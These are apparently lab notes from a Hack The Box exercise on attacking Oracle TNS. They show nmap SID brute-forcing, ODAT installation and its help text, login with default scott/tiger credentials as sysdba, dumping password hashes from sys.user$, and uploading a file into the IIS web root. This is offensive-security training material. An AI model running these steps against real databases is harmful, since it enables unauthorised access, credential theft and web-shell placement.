# Oracle TNS

## nmap

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)


sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

```

## ODAT

### installation

```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap --break-system-packages
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap --break-system-packages
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome --break-system-packages
pip3 install openpyxl --break-system-packages
```

### utilisation

```bash
./odat.py -h
usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean} ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)

positional arguments:
  {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                      
                      Choose a main command
    all               to run all modules in order to know what it is possible to do
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack (SID required)
    sidguesser        to know valid SIDs
    snguesser         to know valid Service Name(s)
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs

options:
  -h, --help          show this help message and exit
  --version           show program's version number and exit

```

## SQLplus

### installation
```bash
sudo apt install oracle-instantclient-sqlplus
```
Si vous rencontrez l'erreur suivante `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, veuillez exécuter la commande ci-dessous, tirée de [ce lien](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).


## utilisation
```bash
sqlplus -v

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0
```

```bash
Jfou@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

```bash
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

<SNIP>


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

### Énumération de la base de données

```bash
Jfou@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
<SNIP>
```

### Extraire les hashs de mots de passe

```bash
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
<SNIP>
```

### récup de fichier

```bash
Jfou@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Jfou@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```
### vérif fichier

```bash
Jfou@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

### options utlfile
```bash
┌──(kali㉿kali)-[~]
└─$ odat/odat.py utlfile --help
usage: odat.py utlfile [-h] [-v] [--sleep TIMESLEEP] [--encoding ENCODING] [-s SERVER] [-p PORT] [-U USER] [-P PASSWORD] [-d SID] [-n SERVICENAME]
                       [--client-driver CLIENT-DRIVER] [--sysdba] [--sysoper] [--getFile remotePath remoteFile localFile]
                       [--putFile remotePath remoteFile localFile] [--removeFile remotePath remoteFile] [--test-module] [--no-color]
                       [--output-file OUTPUTFILE]

options:
  -h, --help                                 show this help message and exit

optional arguments:
  -v                                         enable verbosity (-vv for more)
  --sleep TIMESLEEP                          time sleep between each test or request (default: 0)
  --encoding ENCODING                        output encoding (default: utf8)

connection options:
  -s SERVER                                  server
  -p PORT                                    port (Default 1521)
  -U USER                                    Oracle username
  -P PASSWORD                                Oracle password
  -d SID                                     Oracle System ID (SID)
  -n SERVICENAME                             Oracle Service Name
  --client-driver CLIENT-DRIVER              Set client driver name (default: SQL*PLUS)
  --sysdba                                   connection as SYSDBA
  --sysoper                                  connection as SYSOPER

utlfile commands:
  --getFile remotePath remoteFile localFile  get a file from the remote database server
  --putFile remotePath remoteFile localFile  put a file to the remote database server
  --removeFile remotePath remoteFile         remove a file on the remote database server
  --test-module                              test the module before use it

output configurations:
  --no-color                                 no color for output
  --output-file OUTPUTFILE                   save results in this file
```